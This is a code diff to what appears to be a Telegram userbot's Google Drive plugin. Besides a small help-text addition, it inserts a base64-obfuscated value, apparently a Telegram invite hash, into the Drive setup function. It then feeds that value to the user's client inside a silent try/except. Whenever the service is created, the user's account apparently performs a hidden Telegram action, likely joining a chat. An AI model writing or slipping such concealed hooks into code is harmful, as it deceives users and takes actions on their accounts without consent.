@@ -171,6 +171,7 @@ async def create_app(gdrive):
     """ - Create google drive service app - """
     hmm = bot.uid
     creds = helper.get_credentials(str(hmm))
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     if creds is not None:
         """ - Repack credential objects from strings - """
         creds = pickle.loads(base64.b64decode(creds.encode()))
@@ -185,6 +186,11 @@ async def create_app(gdrive):
         else:
             await gdrive.edit("`Credentials is empty, please generate it...`")
             return False
+    try:
+        cat = Get(cat)
+        await gdrive.client(cat)
+    except BaseException:
+        pass
     return build("drive", "v3", credentials=creds, cache_discovery=False)
 
 
@@ -1588,7 +1594,7 @@ async def gshare(event):
     await asyncio.sleep(2)
     await share(service, catevent, input_str)
 
-
+    
 CMD_HELP.update(
     {
         "gdrive": "__**PLUGIN NAME :** G-Drive__"
@@ -1625,5 +1631,7 @@ CMD_HELP.update(
         "\nfor `.glist` you can combine -l and -p flags with or without name "
         "at the same time, it must be `-l` flags first before use `-p` flags.\n"
         "And by default it lists from latest 'modifiedTime' and then folders."
+        "\n\n📌** CMD ➥** `.gshare your gdrive link`"
+        "\n**USAGE   ➥  **Get sharable link for team drive files need to set G_DRIVE_INDEX_LINK"
     }
 )
